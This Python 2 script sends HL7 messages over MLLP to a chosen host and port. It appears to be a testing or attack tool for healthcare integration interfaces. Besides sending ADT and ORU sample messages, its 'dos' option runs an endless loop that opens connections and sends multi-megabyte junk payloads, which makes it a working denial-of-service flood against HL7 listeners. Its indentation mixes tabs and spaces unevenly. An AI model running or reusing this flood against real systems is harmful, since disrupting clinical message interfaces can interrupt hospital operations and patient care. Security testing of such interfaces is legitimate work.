import sys
import socket
import argparse


msh = "msh"
adt = "MSH|^~\&|ADT1|MCM|LABADT|MCM|198808181126|SECURITY|ADT^A01|MSG00001-|P|2.6"
oru0 ="MSH|^~\&|SendingApplication|SendingFacility|||20140715112021||ORU^R01|D0715112021550d6fff|P|2.4"
oru1 = "OBX|1|NM|86290005^Respiration Rate^SNM||18|258984001^RPM^SNM^/min^Respirations per minute^ISO+||N|||F|||20140715105500||^Services^D"

oru = oru0+'\x0d'+oru1

    
class Main():
         
    def sendMessage(self,host,port,message):
        
        try:
                conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                conn.connect((host, port))
    
    
    #start and end block - used to define start and End of message in MLLP
                start_block = '\x0b'
                end_block = '\x1c'
                carriage_return = b'\x0d'
    
    #create message here
                msg = start_block + message + end_block + carriage_return
		
                
    #send message
                conn.send(msg)
                
    #recieve ack / nack message (buffer size 4096)
                
                ack = conn.recv(4096)
                conn.close()
		print " "
                print "message recieved" 
		print ack
		print " "
                
    #send an exception if connection fails
        except socket.error,msg:
            print "socket error"

class Menu:
    
     def __init__(self):
        
       #get the IP from the command line
        
        parser = argparse.ArgumentParser()
        parser.add_argument('-ip','--ip',help ='specifies the IP address to be scanned')
        parser.add_argument('-port','--port',type=int,help='specify one or multiple ports on the IP address')
	parser.add_argument('-msg','--msg',help='specify the message- adt , msh, dos')

        
        args = parser.parse_args()
        
        if args.ip and args.port:
            
            if args.msg:

                main = Main()
		if args.msg == "adt":
	                main.sendMessage(args.ip,args.port,adt)
			print "message sent:"                
			print adt 
		elif args.msg =="msh":
			main.sendMessage(args.ip,args.port,msh)
			print "message sent:"                
			print msh
		elif args.msg =="oru":
			main.sendMessage(args.ip,args.port,oru)
			print "message sent:"                
			print oru
		elif args.msg =="dos":
			payload = "MSH"*99999999
			
			while (1):
				
				conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		                conn.connect((args.ip, args.port))
				pad1='\x0b'
				pad2='\x0d'
				msg = "MSH"*999999
				fullMsg = pad1+msg+msg+msg+pad2
				conn.send(fullMsg)
				print "big payload sent"
                
            else:
              	main = Main()
                main.sendMessage(args.ip,args.port,"MSH")
		print "message sent:"
		print "MSH"
                

	else:	
            print "invalid adrgument. enter -h for help"

menu = Menu()
